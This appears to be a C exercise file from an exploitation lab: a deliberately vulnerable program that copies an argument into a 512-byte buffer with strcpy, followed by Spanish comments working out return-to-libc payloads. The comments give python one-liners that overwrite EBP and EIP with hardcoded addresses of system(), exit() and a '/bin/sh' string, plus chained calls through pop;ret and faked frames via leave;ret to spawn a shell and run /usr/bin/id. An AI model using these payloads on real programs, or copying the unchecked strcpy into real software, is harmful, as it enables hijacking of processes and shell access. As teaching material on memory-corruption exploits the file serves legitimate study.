#include <stdio.h>
#include <string.h>

fvuln(char *temp1, char *temp2){
  char buffer [512];
  strcpy(buffer, temp2);
  printf("Hola %s %s\n", temp1, buffer);
}
int main(int argc, char *argv[]){
  if(argc < 3)
    exit(0);
  fvuln(argv[1], argv[2]);
  printf("Hasta luego %s %s\n", argv[1], argv[2]);
  return 0;
}

/*
//run A `python -c 'print "A"*520 + "BBBB" + "\x40\x7b\xe3\xb7" + "\xf0\xb7\xe2\xb7" + "\x96\xfc\xff\xbf"'`
//El BBBB es lo que sobreescribe el EBP (sería mejor ponerle el mismo valor que debería tener
//La siguiente dirección es la dirección de system que sobreescribirá el EIP (la obtuvimos usando en gdb>p system)
//La siguiente dirección es la dirección de exit que sobreescribirá el EIP (la obtuvimos usando en gdb>p exit)
//La ultima dirección es la dirección del string "/bin/sh" que teniamos en un export shell=/bin/sh y la buscamos despues de start con x/500s $esp

//Encadenamiento de funciones seguidas
//Podemos encontrar el pop;ret con objdump -d ejecutable
//run A `python -c 'print "A"*520 + "BBBB" + "\x40\x7b\xe3\xb7" + "\x5b\x85\x04\x08" + "\x96\xfc\xff\xbf" + "\x40\x7b\xe3\xb7" + "\xf0\xb7\xe2\xb7" + "\x96\xfc\xff\xbf"'`
//A*520 + EBP + &system() + &pop;ret + &"/bin/sh" + &system() + &exit() + &"/bin/sh"
 
//Encadenamiento mediante falseo de frames (encadenamiento de shellcodes retlib mediante EBPs y leave;ret;)
"\x40\x7b\xe3\xb7" --> system
"\xf0\xb7\xe2\xb7" --> exit
"\x96\xfc\xff\xbf" --> /bin/sh
0xbffffc52 --> /us/bin/id --> "\x52\xfc\xff\xbf"
0x08048484 --> leave;ret --> "\x84\x84\x04\x08"

0xbfffef30 --> shellcode --> "\x30\xef\xff\xbf"
	ebp2 --> shellcode +16+32 --> 0xbfffef60 --> "\x60\xef\xff\xbf"
	ebp3 --> shellcode2 +16+32 --> 0xbfffef90 --> "\x90\xef\xff\xbf"
	ebp4 --> shellcode3 +16 +32 --> 0xbfffefc0 --> "\xc0\xef\xff\xbf"

520 - (16+32+16+32+16+32+8) = 368


//`python -c 'print "\x60\xef\xff\xbf" + "\x40\x7b\xe3\xb7" + "\x84\x84\x04\x08" + "\x52\xfc\xff\xbf" + "A"*32 \ //&shellcode2 + &system() + &(leave;ret) + &"/usr/bin/id"
		+ "\x90\xef\xff\xbf" + "\x40\x7b\xe3\xb7" + "\x84\x84\x04\x08" + "\x96\xfc\xff\xbf" + "A"*32  \ //&shellcode3 + &system() + &(leave;ret) + &"/bin/sh"
		+ "\xc0\xef\xff\xbf" + "\x40\x7b\xe3\xb7" + "\x84\x84\x04\x08" + "\x52\xfc\xff\xbf" + "A"*32  \ //&shellcode2 + &system() + &(leave;ret) + &"/usr/bin/id"
		+ "AAAA" + "\xf0\xb7\xe2\xb7" + "A"*368 + "\x30\xef\xff\xbf" + "\x84\x84\x04\x08"'` //&EBPnull + &exit() + relleno + &shellcode1 + &(leave;ret)
*/
